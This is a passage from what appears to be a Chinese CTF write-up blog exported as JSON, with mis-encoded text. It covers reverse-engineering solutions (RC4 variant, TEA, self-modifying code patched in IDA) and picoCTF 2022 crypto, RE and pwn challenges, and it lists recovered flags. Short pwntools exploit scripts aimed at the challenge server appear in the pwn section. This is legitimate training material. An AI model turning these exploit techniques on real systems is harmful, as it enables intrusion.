0xFFFFFF98, 0x0000006F, 0xFFFFFF8C, 0x00000056, 0xFFFFFFA2, 0x0000004C, 0x00000079, 0x0000007F]for i in range(len(a)-1,-1,-1): a[i]^=a[(i+1)%len(a)] print(a[i], end=&#x27; &#x27;)decimal_numbers =ahex_output = []for num in decimal_numbers: unsigned_32bit_num = num &amp; 0xFFFFFFFF hex_str = hex(unsigned_32bit_num)[2:].upper().zfill(8) hex_output.append(&quot;0x&quot; + hex_str)for i in range(0, len(hex_output), 4): print(&quot;, &quot;.join(hex_output[i:i+4])) #åè¿›åˆ¶50 75 7 4294967205 4294967283 127 16 4294967176 4294967226 10 38 4294967183 4294967188 4294967188 4294967268 4294967229 66 47 4294967237 127 84 121 122 4294967279 4294967206 64 13 #åå…­è¿›åˆ¶0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF0x0000007A, 0x00000079, 0x00000054, 0x0000007F0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF880x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA50x00000007, 0x0000004B, 0x00000032 â€‹ å¤„ç†RC4 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990def to_unsigned_32bit_and_byte(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFdef to_signed_32bit(n): if n &gt; 0x7FFFFFFF: n -= 0x100000000 return ndef to_unsigned_32bit(n): if n &lt; 0: n += 0x100000000 return n &amp; 0xFFFFFFFF# --- RC4 é˜¶æ®µ 1: KSA (å¯†é’¥è°ƒåº¦ç®—æ³•) ---# å®šä¹‰: åˆå§‹åŒ– S ç›’å¹¶æ ¹æ®å¯†é’¥å¯¹å…¶è¿›è¡Œç½®æ¢ã€‚# è¾“å…¥: å¯†é’¥å­—èŠ‚ (key_bytes), å¯†é’¥é•¿åº¦æ¨¡æ•° (key_mod_len)# è¾“å‡º: ç»è¿‡åˆå§‹ç½®æ¢çš„ S ç›’ (s_box)def s_init(key_bytes, key_mod_len): s_box = list(range(256)) v4_ksa_t_box = [key_bytes[i % key_mod_len] for i in range(256)] j = 0 for i in range(256): j = (v4_ksa_t_box[i] + j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box# --- RC4 é˜¶æ®µ 2 &amp; 3: PRGA (ä¼ªéšæœºç”Ÿæˆç®—æ³•) &amp; æœ€ç»ˆæ•°æ®å¤„ç† ---# å®šä¹‰:# PRGA: æ ¹æ® S ç›’ç”Ÿæˆä¼ªéšæœºå¯†é’¥æµã€‚# æœ€ç»ˆæ•°æ®å¤„ç†: ä½¿ç”¨ç”Ÿæˆçš„å¯†é’¥æµå¯¹è¾“å…¥æ•°æ®è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚# è¾“å…¥: å¾…å¤„ç†æ•°æ®æ•°ç»„ (data_array), å¯†é’¥å­—èŠ‚ (key_bytes), # å¯†é’¥é•¿åº¦æ¨¡æ•° (key_mod_len), æ•°æ®é•¿åº¦ (data_len)# è¾“å‡º: ç»è¿‡å¤„ç†åçš„æ•°æ®æ•°ç»„ (result_am_array)def rc4_variant_process(data_array, key_bytes, key_mod_len, data_len): # KSA é˜¶æ®µçš„è°ƒç”¨ s_box = s_init(key_bytes, key_mod_len) l = 0 v9 = 0 # ç”¨äºå­˜å‚¨ç”Ÿæˆçš„å¯†é’¥æµ generated_keystream = [0] * data_len # --- RC4 é˜¶æ®µ 2: PRGA (ç”Ÿæˆå¯†é’¥æµ) --- for k in range(data_len): l = (l + 3) % 256 v9 = (v9 + s_box[l] + 1) % 256 s_box[l], s_box[v9] = s_box[v9], s_box[l] generated_keystream[k] = s_box[(s_box[v9] + s_box[l]) % 256] # --- RC4 é˜¶æ®µ 3: æœ€ç»ˆæ•°æ®å¤„ç† (å¼‚æˆ–æ“ä½œ) --- result_am_array = list(data_array) for i in range(data_len): result_am_array[i] = to_signed_32bit(to_unsigned_32bit(result_am_array[i]) ^ to_unsigned_32bit(generated_keystream[i])) return result_am_arrayif __name__ == &quot;__main__&quot;: rc4_key_string = &#x27;Hello_Ctfers!!!&#x27; key_as_byte_list = list(map(ord, rc4_key_string)) if len(key_as_byte_list) &lt; 16: key_as_byte_list.append(0) KEY_MOD_LEN = 16 am_initial_hex = [ 0x0000000D, 0x00000040, 0xFFFFFFA6, 0xFFFFFFEF, 0x0000007A, 0x00000079, 0x00000054, 0x0000007F, 0xFFFFFFC5, 0x0000002F, 0x00000042, 0xFFFFFFBD, 0xFFFFFFE4, 0xFFFFFF94, 0xFFFFFF94, 0xFFFFFF8F, 0x00000026, 0x0000000A, 0xFFFFFFBA, 0xFFFFFF88, 0x00000010, 0x0000007F, 0xFFFFFFF3, 0xFFFFFFA5, 0x00000007, 0x0000004B, 0x00000032 ] am_initial_data = [to_signed_32bit(h) for h in am_initial_hex] n = len(am_initial_data) final_am_values = rc4_variant_process(am_initial_data, key_as_byte_list, KEY_MOD_LEN, n) output_chars = bytearray() for val in final_am_values: output_chars.append(to_unsigned_32bit_and_byte(val)) print(output_chars.decode(&#x27;latin-1&#x27;)) #NSSCTF&#123;Hn_CtF_w111_end_Lol&#125;","categories":[],"tags":[{"name":"èŠ±æŒ‡ä»¤","slug":"èŠ±æŒ‡ä»¤","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"RC4å˜å¼","slug":"RC4å˜å¼","permalink":"http://example.com/tags/RC4%E5%8F%98%E5%BC%8F/"}]},{"title":"[HDCTF 2023]enc","slug":"HDCTF-2023-enc","date":"2025-07-11T11:35:05.000Z","updated":"2025-07-14T06:49:28.131Z","comments":true,"path":"2025/07/11/HDCTF-2023-enc/","permalink":"http://example.com/2025/07/11/HDCTF-2023-enc/","excerpt":"","text":"é“¾æ¥ æ‰“å¼€è¿›å…¥è¿™ä¸ªå‡½æ•° å‘ç°TEAåŠ å¯† åˆ†æä¹‹åçŸ¥é“ ä¸‹ä¸€æ­¥æ ¸å¯¹çš„v7å’Œv8éƒ½æ˜¯æ”¹å˜åçš„å¯†æ–‡ v9æ‰æ˜¯å¯†é’¥ è§£å¯†æ—¶æ³¨æ„ï¼Œå¼‚æˆ–çš„æ—¶å€™ä»åå¾€å‰å¼‚æˆ–ï¼Œå€’ç€æ¥ è„šæœ¬ 1234567891011121314151617#teaè§£å¯†def tea_decrypt(v, k): v0, v1 = v[0], v[1] delta = 0x61C88647 sum = -(delta * 32) &amp; 0xFFFFFFFF for _ in range(32): v1 = (v1 - ((16*v0 + k[2]) ^ (v0 + sum) ^((v0 &gt;&gt;5) + k[3]))) &amp; 0xFFFFFFFF v0 = (v0 - ((16*v1+ k[0]) ^ (v1 + sum) ^((v1 &gt;&gt;5) + k[1]))) &amp; 0xFFFFFFFF sum = (sum + delta) &amp; 0xFFFFFFFF return [v0, v1] # ç»™å®šå¯†æ–‡v9å’Œå¯†é’¥v10v9 = [0x60fcdef7,0x236dbec]v10 = [0x12,0x34,0x56,0x78]print(tea_decrypt(v9, v10))//key=3 ç»§ç»­çœ‹ä¸‹é¢çš„å‡½æ•° sub_4113DE â€”&gt;sub_414C10â€”&gt;sub_411046â€”&gt;sub_414B00â€”&gt;sub_411221â€”&gt;sub_415340 (char *)a1 æˆ– (_BYTE *)a1 æ˜¯å°†æ•´æ•°åœ°å€ a1 è½¬æ¢ä¸ºå†…å­˜æŒ‡é’ˆã€‚ ç„¶åé€šè¿‡ *ptr ^= a3 ä¿®æ”¹è¯¥åœ°å€ä¸Šçš„å†…å®¹ã€‚ æ‰€ä»¥æ˜¯SMC é‚£ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°å®ƒæ”¹å˜çš„åœ°å€çš„èŒƒå›´ æ‰“å¼€x32xdbg ctrl+gè¾“å…¥00415340 F9è¿è¡Œåä¼šåœåœ¨è¿™é‡Œ æ‰€ä»¥ä¿®æ”¹ä½ç½®çš„ä½ç½®å¤´æ˜¯0x0041D000 é•¿åº¦æ˜¯0ä¸‹600 æ‰€ä»¥åœ¨idaä¸­è¿è¡Œè„šæœ¬ è„šæœ¬ 1234567891011121314151617# å¯¼å…¥ ida_bytes æ¨¡å—ï¼Œè¿™æ˜¯ç°ä»£ IDA Python æ¨èçš„å­—èŠ‚æ“ä½œæ–¹å¼from ida_bytes import get_byte, patch_byte # å®šä¹‰æ“ä½œçš„èµ·å§‹åœ°å€ã€ç»“æŸåœ°å€å’Œå¼‚æˆ–å¯†é’¥start_address = 0x41d000end_address = 0x41E600 # rangeå‡½æ•°ä¸åŒ…å«end_addressxor_key = 3 print(&quot;å¼€å§‹æ‰¹é‡å¼‚æˆ–ä¿®æ”¹...&quot;)# éå†æŒ‡å®šèŒƒå›´å†…çš„æ¯ä¸ªå­—èŠ‚å¹¶è¿›è¡Œå¼‚æˆ–æ“ä½œfor i in range(start_address, end_address): original_byte = get_byte(i) # ä½¿ç”¨ get_byte ä» ida_bytes æ¨¡å—è¯»å–å­—èŠ‚ new_byte = original_byte ^ xor_key patch_byte(i, new_byte) # ä½¿ç”¨ patch_byte ä» ida_bytes æ¨¡å—å†™å…¥å­—èŠ‚print(&quot;ä¿®æ”¹å®Œæˆ&quot;) ä¹‹åå†åœ¨å‡½æ•°å¤´æŒ‰Uç»“æ„ å†é€‰ä¸­èŒƒå›´å»C å°±å¯ä»¥äº† å‘ç°æ˜¯RC4åŠ å¯† è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334key=list(&#x27;you_are_master&#x27;)content=[0xf,0x94,0xae,0xf2,0xc0,0x57,0xc2,0xe0,0x9a,0x45,0x37,0x50,0xf5,0xa0,0x5e,0xcb,0x2c,0x16,0x28,0x29,0xfe,0xff,0x33,0x46,0xe,0x57,0x82,0x22,0x52,0x26,0x2b,0x6e,0xe4,0x82,0x24]rc4number=0x100s=[0]*rc4numberflag=&#x27;&#x27; def rc4_init(s,key,rc4number): for i in range(rc4number): s[i]=i j=0 for i in range(rc4number): j=(j+s[i]+ord(key[i%len(key)]))%rc4number temp=s[i] s[i]=s[j] s[j]=temp def rc4_endecode(s,content,rc4number): i=0 j=0 for k in range(len(content)): i=(i+1)%rc4number j=(j+s[i])%rc4number temp=s[i] s[i]=s[j] s[j]=temp t=(s[i]+s[j])%rc4number content[k]=chr(content[k]^s[t]) content=&#x27;&#x27;.join(content) print(content) rc4_init(s,key,rc4number)rc4_endecode(s,content,rc4number)","categories":[],"tags":[{"name":"NSS","slug":"NSS","permalink":"http://example.com/tags/NSS/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"},{"name":"RC4","slug":"RC4","permalink":"http://example.com/tags/RC4/"}]},{"title":"picoCTF2022","slug":"picoCTF2022","date":"2025-07-10T04:06:13.000Z","updated":"2025-07-14T07:25:49.743Z","comments":true,"path":"2025/07/10/picoCTF2022/","permalink":"http://example.com/2025/07/10/picoCTF2022/","excerpt":"","text":"CRYPTOVigenereé¢˜ç›®ä¿¡æ¯ key CYLAB cipher: rgnoDVD&#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&#125; é¢˜ç›®ç»™äº†å¯†æ–‡å’Œå¯†é’¥ï¼Œç”¨éšæ³¢é€æµæ‰“å¼€ï¼Œè§£å¯†ï¼Œå‘ç°æ˜¯ç»´å‰å°¼äºšåŠ å¯† flag:picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q} basic-mod1é¢˜ç›®ä¿¡æ¯ æè¿°ï¼š æˆ‘ä»¬å‘ç°è¿™ä¸ªå¥‡æ€ªçš„æ¶ˆæ¯åœ¨æœåŠ¡å™¨ä¸Šä¼ é€’ï¼Œæˆ‘ä»¬è®¤ä¸ºæˆ‘ä»¬æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ decrpytion æ–¹æ¡ˆã€‚å–æ¯ä¸ªæ•°å­— mod 37 å¹¶å°†å…¶æ˜ å°„åˆ°ä»¥ä¸‹å­—ç¬¦é›†ï¼š0-25 æ˜¯å­—æ¯è¡¨ï¼ˆå¤§å†™ï¼‰ï¼Œ26-35 æ˜¯åè¿›åˆ¶æ•°å­—ï¼Œ36 æ˜¯ä¸‹åˆ’çº¿ã€‚ä»¥ picoCTF æ ‡å¿—æ ¼å¼åŒ…è£…è§£å¯†çš„æ¶ˆæ¯ï¼ˆå³ picoCTF{decrypted_message}ï¼‰ æ•°å­—ï¼š350 63 353 198 114 369 346 184 202 322 94 235 114 110 185 188 225 212 366 374 261 213 æŒ‰ç…§é¢˜ç›®ä¿¡æ¯å¯¹å–æ¨¡åšçš„æ•°å­—æ ¹æ®å…¶ASCLLç ä¿®æ”¹ï¼Œå¹¶è½¬åŒ–ä¸ºå­—ç¬¦è¾“å‡º 123456789101112131415161718def simplify_numbers(numbers): result = [] for num in numbers: remainder = num % 37 if 0 &lt;= remainder &lt;= 25: result.append(chr(ord(&#x27;A&#x27;) + remainder)) elif 26 &lt;= remainder &lt;= 35: result.append(str(remainder - 26)) elif remainder == 36: result.append(&#x27;_&#x27;) else: result.append(f&quot;[&#123;remainder&#125;]&quot;) return &quot;&quot;.join(result)my_numbers = [350, 63, 353, 198, 114, 369, 346, 184, 202, 322, 94, 235, 114, 110, 185, 188, 225, 212, 366, 374, 261, 213]simplified_string = simplify_numbers(my_numbers)print(simplified_string) flagï¼špicoCTF{R0UND_N_R0UND_ADD17EC2} substitution0é¢˜ç›®ä¿¡æ¯ æè¿°ï¼š ä¸€æ¡æ¶ˆæ¯è¿›æ¥äº†ï¼Œä½†ä¼¼ä¹å…¨éƒ½ä¹±ä¸ƒå…«ç³Ÿã€‚å¹¸è¿çš„æ˜¯ï¼Œå®ƒä¼¼ä¹ä¸€å¼€å§‹å°±æœ‰é’¥åŒ™ã€‚ä½ èƒ½ç ´è§£è¿™ä¸ªæ›¿æ¢å¯†ç å—ï¼Ÿ å¯†æ–‡ï¼š OHNFUMWSVZLXEGCPTAJDYIRKQB Suauypcg Xuwaogf oacju, rvds o waoiu ogf jdoduxq ova, ogf hacywsd eu dsu huudxumace o wxojj noju vg rsvns vd roj ugnxcjuf. Vd roj o huoydvmyx jnoaohouyj, ogf, oddsod dveu, yglgcrg dc godyaoxvjdjâ€”cm ncyaju o wauod pavbu vg o jnvugdvmvn pcvgdcm ivur. Dsuau ruau drc acygf hxonl jpcdj guoa cgu ukdauevdq cm dsu honl, ogf oxcgw cgu guoa dsu cdsua. Dsu jnoxuj ruau uknuufvgwxq soaf ogf wxcjjq, rvds oxx dsuoppuoaognu cm hyagvjsuf wcxf. Dsu ruvwsd cm dsu vgjund roj iuaq aueoalohxu, ogf,dolvgw oxx dsvgwj vgdc ncgjvfuaodvcg, V ncyxf soafxq hxoeu Zypvdua mca svj cpvgvcgaujpundvgw vd. Dsu mxow vj: pvncNDM&#123;5YH5717Y710G_3I0XY710G_03055505&#125; è§£å¯† çŒœæµ‹å¯†é’¥å‡¯æ’’å¯†ç åŠ å¯†ï¼ŒæŠŠç¬¬ä¸€å¥ä½œä¸ºå¯†é’¥ flag; picoCTF{5UB5717U710N_3V0LU710N_03055505} RESafe Openeré¢˜ç›®ä¿¡æ¯ æè¿°ï¼šä½ èƒ½æ‰“å¼€è¿™ä¸ªä¿é™©ç®±å—ï¼Ÿæˆ‘å¿˜è®°äº†ä¿é™©ç®±çš„é’¥åŒ™ï¼Œä½†è¿™ä¸ªç¨‹åºåº”è¯¥å¯ä»¥å¸®åŠ©æˆ‘æ‰¾å›ä¸¢å¤±çš„é’¥åŒ™ã€‚ä½ èƒ½å¸®æˆ‘æ‰“å¼€ä¿é™©ç®±å—ï¼Ÿå°†æ‚¨æ¢å¤çš„å¯†ç æ”¾å…¥ picoCTF æ ‡å¿—æ ¼å¼ï¼Œä¾‹å¦‚ï¼špicoCTF{password} ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.*;import java.util.*; public class SafeOpener &#123; public static void main(String args[]) throws IOException &#123; BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder();//Base6çš„ç¼–ç å™¨ String encodedkey = &quot;&quot;; String key = &quot;&quot;; int i = 0; boolean isOpen; while (i &lt; 3) &#123; System.out.print(&quot;Enter password for the safe: &quot;); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes());//å¯¹å¯†ç è¿›è¡ŒBase64åŠ å¯† System.out.println(encodedkey); isOpen = openSafe(encodedkey);//è°ƒç”¨æ–¹æ³•è¿›è¡Œæ ¸å¯¹ if (!isOpen) &#123; System.out.println(&quot;You have &quot; + (2 - i) + &quot; attempt(s) left&quot;); i++; continue; &#125; break; &#125; &#125; public static boolean openSafe(String password) &#123; String encodedkey = &quot;cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz&quot;;//BASE64åŠ å¯†åçš„ç»“æœ if (password.equals(encodedkey)) &#123; System.out.println(&quot;Sesame open&quot;); return true; &#125; else &#123; System.out.println(&quot;Password is incorrect\\n&quot;); return false; &#125; &#125;&#125; æ­£å¦‚ä»£ç ä¸­çš„æ³¨é‡Šä¸€æ ·ï¼Œç”¨æˆ·è¾“å…¥å¯†ç ï¼Œè¿›è¡ŒBase64ç¼–ç ï¼Œè°ƒç”¨å‡½æ•°æ£€éªŒç¼–ç åšçš„æ•°å€¼æ˜¯å¦ç¬¦åˆæŒ‡å®šå­—ç¬¦ï¼Œæ‰€ä»¥å¯†ç å°±æ˜¯æŒ‡å®šå­—ç¬¦Base64è§£ç  flagï¼špicoCTF{pl3as3_l3t_m3_1nt0_th3_saf3} GDB testé¢˜ç›®ä¿¡æ¯ ä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿ ä»¥ä¸‹æ˜¯è¯•ç”¨è¯´æ˜ï¼š 123456$ chmod +x gdbme$ gdb gdbme(gdb) layout asm(gdb) break *(main+99)(gdb) run(gdb) jump *(main+104) è§£å¯† æŒ‰ç…§ç»™çš„å‘½ä»¤è¿›è¡Œæ“ä½œ flag: picoCTF{d3bugg3r_dr1v3_7776d758} fresh-javaé¢˜ç›®ä¿¡æ¯ ä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ª Java ç¨‹åºè¿›è¡Œé€†å‘å·¥ç¨‹ ç”¨jad-guiæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°è¯¥å¯†æ–‡å·²å°†è¢«å®šä¹‰å¥½äº† flagï¼špicoCTF{700l1ng_r3qu1r3d_738cac89} file-run1é¢˜ç›®ä¿¡æ¯ å·²ä¸ºæ‚¨æä¾›ä¸€ä¸ªç¨‹åºï¼Œå¦‚æœæ‚¨å°è¯•åœ¨å‘½ä»¤è¡Œä¸Šè¿è¡Œå®ƒä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ è§£å¯† é¦–å…ˆè¦ä¸ºç¨‹åºèµ‹æƒé™ chmod +x ru è¿è¡Œè¯¥ç¨‹åºå¹¶ä¸”æ‰§è¡Œå‘½ä»¤.&#x2F;run flag:picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b} file-run2é¢˜ç›®ä¿¡æ¯ å¦ä¸€ä¸ªç¨‹åºï¼Œä½†è¿™ä¸€æ¬¡ï¼Œå®ƒä¼¼ä¹éœ€è¦ä¸€äº›è¾“å…¥ã€‚å¦‚æœæ‚¨å°è¯•åœ¨å‘½ä»¤è¡Œä¸Šè¿è¡Œå®ƒå¹¶è¾“å…¥ â€œHelloï¼â€ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼Ÿ è§£å¯† é¦–å…ˆè¦ä¸ºç¨‹åºèµ‹æƒé™ chmod +x ru è¿è¡Œè¯¥ç¨‹åºå¹¶ä¸”æ‰§è¡Œå‘½ä»¤.&#x2F;run Hello! flag:picoCTF{F1r57_4rgum3n7_f65ed63e} Bbbbloaté¢˜ç›®ä¿¡æ¯ ä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘å·¥ç¨‹ã€‚ è§£å¯† åˆ†æå¾—åˆ°ï¼Œæœ€å–œæ¬¢çš„æ˜¯æ•°å­—åº”è¯¥ä¸º549255 ä¸ºæ–‡ä»¶èµ‹æƒé™ chmod +x Bbbbloat è¿è¡Œç¨‹åº./Bbbbloat flagï¼špicoCTF{cu7_7h3_bl047_44f74a60} unpackmeé¢˜ç›®æè¿° ä½ èƒ½å¾—åˆ°è¿™é¢æ——å¸œå—ï¼Ÿå¯¹è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘å·¥ç¨‹ã€‚ è§£å¯† æ–‡ä»¶ä»¥upxç»“å°¾ï¼Œå°è¯•upxè„±å£³ ä¹‹åæ‹–å…¥idaä¸­ å‘ç°æœ€å–œçˆ±çš„æ•°å­—æ˜¯754635 flag: picoCTF{up&gt;&lt;_m3_f7w_e510a27f} PWNRPSé¢˜ç›®æè¿° è¿™æ˜¯ä¸€ä¸ªå¯¹ä½ ç©çŸ³å¤´å‰ªåˆ€å¸ƒçš„ç¨‹åºã€‚æˆ‘å¬è¯´å¦‚æœä½ è¿ç»­èµ¢äº† 5 æ¬¡ï¼Œå°±ä¼šå‘ç”Ÿå¥½äº‹ã€‚å¯ä»¥ä¸‹è½½å¸¦æœ‰æ ‡è®°å·²ç¼–è¾‘çš„ç¨‹åºæºä»£ç  è¿™é‡Œ ã€‚ è§£å¯† ä¸»å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int main () &#123; char input[3] = &#123;&#x27;\\0&#x27;&#125;; int command; int r; puts(&quot;Welcome challenger to the game of Rock, Paper, Scissors&quot;); puts(&quot;For anyone that beats me 5 times in a row, I will offer up a flag I found&quot;); puts(&quot;Are you ready?&quot;); while (true) &#123; puts(&quot;Type &#x27;1&#x27; to play a game&quot;); puts(&quot;Type &#x27;2&#x27; to exit the program&quot;); r = tgetinput(input, 3); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; //å‰é¢é‚£äº›éƒ½ä¸é‡è¦ if ((command = strtol(input, NULL, 10)) == 0) &#123; puts(&quot;Please put in a valid number&quot;); &#125; else if (command == 1) &#123; printf(&quot;\\n\\n&quot;); if (play()) &#123; wins++; &#125; else &#123; wins = 0; &#125; if (wins &gt;= 5) &#123; puts(&quot;Congrats, here&#x27;s the flag!&quot;); puts(flag); &#125; &#125; else if (command == 2) &#123; return 0; &#125; else &#123; puts(&quot;Please type either 1 or 2&quot;); &#125; &#125; return 0;&#125; åˆ¤æ–­èƒœè´Ÿ 1234567891011121314151617181920212223242526//åˆ¤æ–­èƒœè´Ÿbool play () &#123; char player_turn[100]; srand(time(0));//ç”µè„‘çš„å‡ºæ‹³è®¾è®¡ int r; printf(&quot;Please make your selection (rock/paper/scissors):\\n&quot;);//æ ¡éªŒ r = tgetinput(player_turn, 100); if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; int computer_turn = rand() % 3;//ç¡®ä¿åœ¨3ä¸ªæ‰‹åŠ¿ä¸­éšæœºé€‰æ‹©ä¸€ä¸ª printf(&quot;You played: %s\\n&quot;, player_turn); printf(&quot;The computer played: %s\\n&quot;, hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) &#123;//æ ¸éªŒæˆ‘ä»¬æ‰€å‡ºçš„æ˜¯å¦åŒ…å«èƒœåˆ©æ‰€éœ€è¦åº•è‰²é‚£ä¸ªæ‰‹åŠ¿ puts(&quot;You win! Play again?&quot;); return true; &#125; else &#123; puts(&quot;Seems like you didn&#x27;t win this time. Play again?&quot;); return false; &#125;&#125; æ‰€ä»¥æˆ‘ä»¬è¦ç»è¿‡5æ¬¡å¾ªç¯ï¼Œä¸”æ¯æ¬¡å¾ªç¯éƒ½è¦å‘ç¨‹åºè¾“å‡ºrock&#x2F;paper&#x2F;scissorsçš„ç»“åˆ è„šæœ¬12345678from pwn import *p = remote(&#x27;saturn.picoctf.net&#x27;, 60179)for i in range(5): p.sendline(b&#x27;1&#x27;) p.sendline(b&#x27;rock/paper/scissors&#x27;)print(p.recvline_contains(b&#x27;picoCTF&#123;&#x27;)) basic-file-exploit æ¼æ´é¢˜ç›®ä¿¡æ¯ æä¾›çš„ç¨‹åºå…è®¸æ‚¨å†™å…¥æ–‡ä»¶å¹¶ä»ä¸­è¯»å–æ‚¨å†™å…¥çš„å†…å®¹ã€‚è¯•ç€ç©å¼„å®ƒï¼Œçœ‹çœ‹ä½ æ˜¯å¦èƒ½æ‰“ç ´å®ƒï¼å¯ä»¥ä¸‹è½½å¸¦æœ‰æ ‡è®°å·²ç¼–è¾‘çš„ç¨‹åºæºä»£ç  è¿™é‡Œ è§£å¯† æœ‰åˆ†æå¯å¾—tgetinputç”¨æ¥æ ¡éªŒç©ºè¾“å…¥ç­‰åŸºæœ¬æ ¡éªŒå·¥ä½œï¼Œdata_writeæ•°æ®è¾“å…¥ï¼Œdata_readæ•°æ®è¯»å–ï¼Œä¸”å…¶ä¸­åŒ…å«flagçš„è¾“å‡º ç”±mainå¯ä»¥çŸ¥é“ã€‚é¦–å…ˆé€‰æ‹©è¦è¿›è¡Œçš„æ¨¡å¼ï¼Œä¸”ç¬¬ä¸€æ¬¡å¿…é¡»å…ˆå­˜å…¥ï¼Œå¦åˆ™æ— æ³•è°ƒç”¨data_readå‡½æ•° 123456789101112131415161718192021222324252627static void data_read() &#123; char entry[4]; long entry_number; char output[100]; int r; memset(output, &#x27;\\0&#x27;, 100); printf(&quot;Please enter the entry number of your data:\\n&quot;); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//å°è¯•å°† entry å­—ç¬¦ä¸²çš„å¼€å¤´éƒ¨åˆ†è§£ææˆä¸€ä¸ªåè¿›åˆ¶çš„é•¿æ•´å‹æ•°å€¼ï¼Œ puts(flag); fseek(stdin, 0, SEEK_END); exit(0); &#125; entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output);&#125; æ‰€ä»¥é‡ç‚¹å°±æ˜¯((entry_number = strtol(entry, NULL, 10)) == 0)çš„è¾“å‡ºç»“æœä¸º0 flag:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F} buffer overflow 0é¢˜ç›®ä¿¡æ¯ è®©æˆ‘ä»¬ä»ç®€å•çš„å¼€å§‹ï¼Œä½ èƒ½æº¢å‡ºæ­£ç¡®çš„ç¼“å†²åŒºå—ï¼Ÿè¯¥ç¨‹åºå¯åœ¨æ­¤å¤„è·å¾—ã€‚æ‚¨å¯ä»¥æŸ¥çœ‹æºä»£ç  è¿™é‡Œ ã€‚ è§£å¯† ä¸»å‡½æ•° signal(11, sigsegv_handler)å½“ç¨‹åºå‘ç”Ÿæ®µé”™è¯¯ï¼ˆå³æ”¶åˆ°ä¿¡å· 11ï¼Œä¹Ÿå°±æ˜¯ SIGSEGVï¼‰æ—¶ï¼Œä¸æ‰§è¡Œé»˜è®¤æ“ä½œï¼ˆå´©æºƒï¼‰ï¼Œè€Œæ˜¯è·³è½¬åˆ°ä½ å®šä¹‰çš„ sigsegv_handler å‡½æ•°è¿›è¡Œå¤„ç†ã€‚ å½“ä½ çš„ç¨‹åºè¯•å›¾è®¿é—®éæ³•å†…å­˜åœ°å€ï¼ˆå¦‚æœªåˆ†é…çš„å†…å­˜ã€åªè¯»å†…å­˜ã€å·²é‡Šæ”¾çš„å†…å­˜ç­‰ï¼‰æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå‘é€è¿™ä¸ªä¿¡å·ç»™ç¨‹åºã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ”¶åˆ° SIGSEGV ä¼šå¯¼è‡´ç¨‹åºå´©æºƒï¼ˆæ®µé”™è¯¯ï¼‰ã€‚ ç¤ºä¾‹è§¦å‘åŸå› ï¼š è§£å¼•ç”¨ç©ºæŒ‡é’ˆï¼š*NULL å†™å…¥å¸¸é‡å­—ç¬¦ä¸²ï¼šstrcpy(&quot;hello&quot;, &quot;world&quot;) è¶Šç•Œè®¿é—®æ ˆæ•°ç»„ã€å †æ•°ç»„ ä½¿ç”¨æœªåˆå§‹åŒ–çš„æŒ‡é’ˆ è¿™ä¸ªå¯¹flag.txtæ–‡ä»¶çš„æ“ä½œ ç›¸å½“äºbin&#x2F;shåé—¨å‡½æ•° å®ƒåŒ…å«äº†è¯»å–flag,å¹¶æŠŠflagè¾“å‡ºåœ¨ç»ˆç«¯ è€Œåœ¨ Linux&#x2F;Unix ç³»ç»Ÿä¸­ï¼Œ/bin/sh æ˜¯ä¸€ä¸ªæŒ‡å‘ç³»ç»Ÿé»˜è®¤ shellï¼ˆå¦‚ Bashï¼‰çš„å¯æ‰§è¡Œæ–‡ä»¶ sigsegv_handlerå‡½æ•° è¯¥å‡½æ•°ä¼šè¾“å‡ºflag æ‰€ä»¥åªéœ€è¦å®ç°å°±å¯ä»¥è¾“å‡ºflag è„šæœ¬1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 